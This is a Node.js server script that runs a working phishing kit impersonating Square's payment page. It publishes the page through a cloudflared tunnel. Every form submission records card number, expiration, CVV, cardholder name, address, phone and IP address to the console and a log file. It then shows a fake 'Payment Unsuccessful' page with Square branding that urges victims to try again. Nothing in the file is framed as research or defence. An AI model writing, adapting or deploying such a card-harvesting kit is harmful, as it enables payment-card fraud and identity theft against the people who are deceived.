const http = require('http');
const fs = require('fs');
const net = require('net');
const path = require('path');
const { spawn } = require('child_process');

const GREEN = '\u001b[32m';
const RED = '\u001b[31m';
const YELLOW = '\u001b[33m';
const PURPLE = '\u001b[35m';
const RESET = '\u001b[0m';

const TEMPLATE_PATH = path.join(__dirname, 'template.html');

function getWritableLogPath() {
  const candidates = [
    path.join(process.cwd(), 'server.log'),
    path.join(require('os').homedir(), 'square-server.log'),
    path.join(require('os').tmpdir(), 'square-server.log')
  ];

  for (const candidate of candidates) {
    try {
      const testFile = `${candidate}.tmp`;
      fs.writeFileSync(testFile, 'ok');
      fs.unlinkSync(testFile);
      return candidate;
    } catch (_err) {
      // Try the next location.
    }
  }

  return path.join(process.cwd(), 'server.log');
}

const LOG_PATH = getWritableLogPath();
const LOG_STREAM = fs.createWriteStream(LOG_PATH, { flags: 'a' });
const HTML_PAGE = fs.readFileSync(TEMPLATE_PATH, 'utf8');

function logMessage(message) {
  const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' ');
  const line = `[${timestamp}] ${message}`;
  console.log(message);
  LOG_STREAM.write(`${line}\n`);
}

function getIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string' && forwarded.trim()) {
    return forwarded.split(',')[0].trim();
  }

  const socketAddress = req.socket && req.socket.remoteAddress;
  if (socketAddress) {
    return socketAddress.replace(/^::ffff:/, '');
  }

  return 'unknown';
}

function logRequest(req, res, next) {
  const method = req.method || 'GET';
  const pathname = new URL(req.url || '/', 'http://localhost').pathname;
  const ip = getIP(req);
  const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' ');

  let color = YELLOW;
  switch (method) {
    case 'GET':
      color = GREEN;
      break;
    case 'POST':
      color = RED;
      break;
    default:
      color = YELLOW;
  }

  const message = `${color}[${timestamp}] ${method} "${method} ${pathname}" from ${ip}${RESET}`;
  console.log(message);
  LOG_STREAM.write(`[${timestamp}] ${method} "${method} ${pathname}" from ${ip}\n`);
  next();
}

function getAvailablePort(startPort = 5000) {
  return new Promise((resolve, reject) => {
    const tryPort = (port) => {
      const tester = net.createServer();

      tester.once('error', (err) => {
        if (err.code === 'EADDRINUSE') {
          resolve(getAvailablePort(port + 1));
          return;
        }
        reject(err);
      });

      tester.once('listening', () => {
        const address = tester.address();
        tester.close(() => resolve(address.port));
      });

      tester.listen(port);
    };

    tryPort(startPort);
  });
}

function startCloudflared(port) {
  return new Promise((resolve) => {
    const child = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${port}`], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: process.env
    });

    let publicURL = '';

    const handleOutput = (chunk) => {
      const text = chunk.toString();
      const match = text.match(/https:\/\/[-a-zA-Z0-9]+\.trycloudflare\.com/g);
      if (match && match.length > 0) {
        publicURL = match[0];
        console.log(`${PURPLE}Cloudflared URL: ${publicURL}${RESET}`);
      }
    };

    child.stdout.on('data', handleOutput);
    child.stderr.on('data', handleOutput);

    child.on('error', (err) => {
      console.error(`Cloudflared start error: ${err.message}`);
      resolve('');
    });

    setTimeout(() => resolve(publicURL), 2000);
  });
}

function readRequestBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];

    req.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

async function main() {
  const port = await getAvailablePort(5000);
  const publicURL = await startCloudflared(port);

  const server = http.createServer(async (req, res) => {
    logRequest(req, res, async () => {
      const url = new URL(req.url || '/', `http://localhost:${port}`);

      if (req.method === 'GET' && url.pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(HTML_PAGE);
        return;
      }

      if (req.method === 'POST' && url.pathname === '/submit') {
        try {
          const body = await readRequestBody(req);
          const form = new URLSearchParams(body);

          const submitted = [
            '',
            '----- FORM SUBMISSION -----',
            `Amount:        ${form.get('amount') || ''}`,
            `Card Number:   ${form.get('cardnumber') || ''}`,
            `Expiration:    ${form.get('exp') || ''}`,
            `CVV:           ${form.get('cvv') || ''}`,
            `Name:          ${form.get('cardname') || ''}`,
            `Address:       ${form.get('address') || ''}`,
            `City:          ${form.get('city') || ''}`,
            `State:         ${form.get('state') || ''}`,
            `Zip:           ${form.get('zip') || ''}`,
            `Phone:         ${form.get('phone') || ''}`,
            `IP Address:    ${getIP(req)}`,
            '----------------------------',
            ''
          ].join('\n');

          console.log(submitted);
          LOG_STREAM.write(`${submitted}\n`);

          const failurePage = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
  <title>Payment Unsuccessful</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #f7f7f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 10px;
      box-sizing: border-box;
    }
    .card {
      background: #fff;
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
      width: 100%;
      max-width: 390px;
      text-align: center;
    }
    .logo {
      margin-bottom: 20px;
    }
    h2 {
      text-align: center;
      font-weight: 500;
      margin-bottom: 25px;
      color: #1a1a1a;
      font-size: 22px;
    }
    .status {
      color: #d93025;
      font-size: 28px;
      font-weight: 700;
      margin: 0 0 12px;
      letter-spacing: 0.5px;
    }
    .message {
      color: #b3261e;
      font-size: 15px;
      line-height: 1.5;
      margin-bottom: 20px;
    }
    .warning {
      display: inline-block;
      background: #fdecea;
      color: #d93025;
      border: 1px solid #f9c8c2;
      border-radius: 4px;
      padding: 8px 10px;
      font-size: 12px;
      font-weight: 700;
      letter-spacing: 0.5px;
      text-transform: uppercase;
      margin-bottom: 18px;
    }
    button {
      width: 100%;
      background: #006aff;
      color: #fff;
      border: none;
      padding: 18px;
      border-radius: 4px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    button:active { background: #0056ce; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="40" height="40" viewBox="0 0 40 40">
        <path d="M33.3 0H6.7C3 0 0 3 0 6.7v26.6C0 37 3 40 6.7 40h26.6c3.7 0 6.7-3 6.7-6.7V6.7C40 3 37 0 33.3 0zm-2.2 31.1H8.9V8.9h22.2v22.2zm-4.4-17.8H13.3v13.4h13.4V13.3z" fill="#006aff"/>
      </svg>
    </div>
    <h2>Square</h2>
    <div class="warning">Verification Failed</div>
    <div class="status">Payment Unsuccessful</div>
    <div class="message">We could not complete your transaction. Please review your payment details and try again.</div>
    <button type="button" onclick="window.location.href='/'">Try Again</button>
  </div>
</body>
</html>`;

          res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
          res.end(failurePage);
          return;
        } catch (error) {
          console.error(error);
          res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
          res.end('Internal Server Error');
          return;
        }
      }

      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Not Found');
    });
  });

  server.listen(port, () => {
    console.log(`${PURPLE}Server running on http://localhost:${port}${RESET}`);
    if (publicURL) {
      console.log(`${PURPLE}Public URL: ${publicURL}${RESET}`);
    }
  });

  process.on('SIGINT', () => {
    LOG_STREAM.end();
    process.exit(0);
  });
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
